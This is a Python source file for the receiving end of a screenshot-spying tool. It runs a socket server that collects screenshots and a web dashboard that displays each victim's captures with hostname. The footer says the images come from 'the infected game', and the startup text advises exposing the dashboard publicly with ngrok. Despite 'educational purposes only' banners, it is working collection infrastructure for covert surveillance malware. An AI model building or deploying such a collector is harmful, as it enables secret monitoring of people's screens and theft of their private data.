"""
Web interface to view captured screenshots - Auto-refreshes every 30s
Run this alongside the server
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import threading
from my_server import ScreenshotServer
import time

# Global server instance
screenshot_server = ScreenshotServer(port=9999)


class ScreenshotHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            # Serve main HTML page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            html = self.get_html_template()
            self.wfile.write(html.encode())

        elif self.path == '/api/latest':
            # API endpoint for latest screenshot
            latest = screenshot_server.get_latest_screenshot()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            if latest:
                # Check if file exists and get its data
                if os.path.exists(latest['filename']):
                    with open(latest['filename'], 'rb') as f:
                        img_data = f.read()

                    import base64
                    img_b64 = base64.b64encode(img_data).decode('utf-8')
                    latest['image_data'] = f"data:image/png;base64,{img_b64}"

            self.wfile.write(json.dumps(latest or {}).encode())

        elif self.path == '/api/all':
            # API endpoint for all screenshots
            all_shots = screenshot_server.get_all_screenshots()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            self.wfile.write(json.dumps(all_shots or []).encode())

        else:
            self.send_response(404)
            self.end_headers()

    def get_html_template(self):
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Screenshot Monitor - Security Demo</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .header {
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 {
            color: #2d3748;
            margin: 0;
            font-size: 2.5em;
        }
        .subtitle {
            color: #718096;
            margin-top: 10px;
            font-size: 1.1em;
        }
        .warning {
            background: #fed7d7;
            border-left: 4px solid #f56565;
            padding: 15px;
            margin: 20px 0;
            border-radius: 8px;
            color: #742a2a;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-top: 30px;
        }
        .screenshot-container {
            flex: 2;
            min-width: 300px;
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .info-container {
            flex: 1;
            min-width: 250px;
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .screenshot-img {
            width: 100%;
            border: 3px solid #e2e8f0;
            border-radius: 10px;
            background: #f7fafc;
            min-height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #a0aec0;
            font-size: 1.2em;
        }
        .screenshot-img img {
            max-width: 100%;
            max-height: 500px;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .info-item {
            padding: 15px;
            background: #f7fafc;
            border-radius: 10px;
            margin-bottom: 15px;
            border-left: 4px solid #4fd1c7;
        }
        .info-item h3 {
            margin: 0 0 8px 0;
            color: #2d3748;
            font-size: 1.1em;
        }
        .info-item p {
            margin: 0;
            color: #718096;
            font-size: 0.95em;
        }
        .status {
            padding: 12px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
            background: #c6f6d5;
            color: #276749;
        }
        .timestamp {
            text-align: center;
            color: #718096;
            margin-top: 15px;
            font-size: 0.9em;
        }
        .refresh-info {
            text-align: center;
            margin-top: 20px;
            color: #718096;
            font-size: 0.9em;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        button {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            background: #4fd1c7;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            flex: 1;
        }
        button:hover {
            background: #38b2ac;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        button:active {
            transform: translateY(0);
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9em;
        }
        .hostname {
            color: #4fd1c7;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕵️ Screenshot Monitoring Dashboard</h1>
        <p class="subtitle">Security Education Demonstration - FOR EDUCATIONAL PURPOSES ONLY</p>
        <div class="warning">
            ⚠️ <strong>WARNING:</strong> This is a security demonstration for educational purposes only. 
            Do not use this code for unauthorized surveillance.
        </div>
    </div>

    <div class="status" id="status">
        🔄 Waiting for first screenshot...
    </div>

    <div class="container">
        <div class="screenshot-container">
            <h2>Latest Screenshot</h2>
            <div class="screenshot-img" id="screenshot">
                <div>No screenshot received yet</div>
            </div>
            <div class="timestamp" id="timestamp"></div>
        </div>

        <div class="info-container">
            <h2>Connection Info</h2>
            <div class="info-item">
                <h3>🖥️ Source Host</h3>
                <p id="hostname">Unknown</p>
            </div>
            <div class="info-item">
                <h3>📏 Image Size</h3>
                <p id="imageSize">0 KB</p>
            </div>
            <div class="info-item">
                <h3>📊 Total Captured</h3>
                <p id="totalCaptured">0 images</p>
            </div>
            <div class="info-item">
                <h3>🔄 Auto-refresh</h3>
                <p>Updates every 30 seconds</p>
            </div>

            <div class="controls">
                <button onclick="refreshScreenshot()">🔄 Refresh Now</button>
                <button onclick="clearHistory()">🗑️ Clear History</button>
            </div>

            <div class="refresh-info">
                Next auto-refresh in: <span id="countdown">30</span> seconds
            </div>
        </div>
    </div>

    <div class="footer">
        <p>Security Education Project | This dashboard displays screenshots captured from the infected game</p>
    </div>

    <script>
        let refreshCountdown = 30;
        let countdownInterval;

        function updateCountdown() {
            refreshCountdown--;
            document.getElementById('countdown').textContent = refreshCountdown;

            if (refreshCountdown <= 0) {
                refreshCountdown = 30;
                fetchLatestScreenshot();
            }
        }

        function formatBytes(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function formatTime(timestamp) {
            if (!timestamp) return 'N/A';
            const date = new Date(timestamp * 1000);
            return date.toLocaleTimeString() + ' ' + date.toLocaleDateString();
        }

        async function fetchLatestScreenshot() {
            try {
                const response = await fetch('/api/latest');
                const data = await response.json();

                if (data.image_data) {
                    // Update screenshot
                    document.getElementById('screenshot').innerHTML = 
                        `<img src="${data.image_data}" alt="Captured Screenshot">`;

                    // Update info
                    document.getElementById('hostname').textContent = data.hostname || 'Unknown';
                    document.getElementById('imageSize').textContent = formatBytes(data.size || 0);
                    document.getElementById('timestamp').textContent = 
                        `Captured: ${data.time_str || formatTime(data.timestamp)}`;

                    // Update status
                    const statusEl = document.getElementById('status');
                    statusEl.textContent = `✅ Screenshot received from ${data.hostname}`;
                    statusEl.style.background = '#c6f6d5';
                    statusEl.style.color = '#276749';
                }

                // Update total count
                const allResponse = await fetch('/api/all');
                const allData = await allResponse.json();
                document.getElementById('totalCaptured').textContent = 
                    `${allData.length} image${allData.length !== 1 ? 's' : ''}`;

            } catch (error) {
                console.error('Error fetching screenshot:', error);
                document.getElementById('status').textContent = 
                    '❌ Error connecting to server';
                document.getElementById('status').style.background = '#fed7d7';
                document.getElementById('status').style.color = '#742a2a';
            }
        }

        function refreshScreenshot() {
            refreshCountdown = 30;
            document.getElementById('countdown').textContent = refreshCountdown;
            fetchLatestScreenshot();
        }

        function clearHistory() {
            if (confirm('Clear all captured screenshots? This cannot be undone.')) {
                fetch('/api/clear', { method: 'POST' })
                    .then(() => {
                        alert('History cleared');
                        refreshScreenshot();
                    })
                    .catch(error => console.error('Error clearing:', error));
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            fetchLatestScreenshot();
            countdownInterval = setInterval(updateCountdown, 1000);
        });
    </script>
</body>
</html>
"""

    def log_message(self, format, *args):
        # Suppress default log messages
        pass


def run_web_server():
    """Run the web interface on port 8000"""
    web_server = HTTPServer(('0.0.0.0', 8000), ScreenshotHandler)
    print(f"[WEB] Screenshot viewer running on http://localhost:8000")
    print(f"[WEB] Connect to this from ngrok: ngrok http 8000")
    web_server.serve_forever()


def run_socket_server():
    """Run the socket server in background"""
    screenshot_server.start()


if __name__ == "__main__":
    print("=" * 60)
    print("SCREENSHOT MONITORING SYSTEM - SECURITY DEMO")
    print("=" * 60)
    print("FOR EDUCATIONAL PURPOSES ONLY")
    print("\nStarting servers...")
    print("1. Socket server on port 9999 (receives screenshots)")
    print("2. Web interface on port 8000 (displays screenshots)")
    print("\nUse 'ngrok http 8000' to expose the web interface publicly")
    print("=" * 60)

    # Start socket server in background thread
    socket_thread = threading.Thread(target=run_socket_server, daemon=True)
    socket_thread.start()

    # Start web server (main thread)
    time.sleep(2)  # Give socket server time to start
    run_web_server()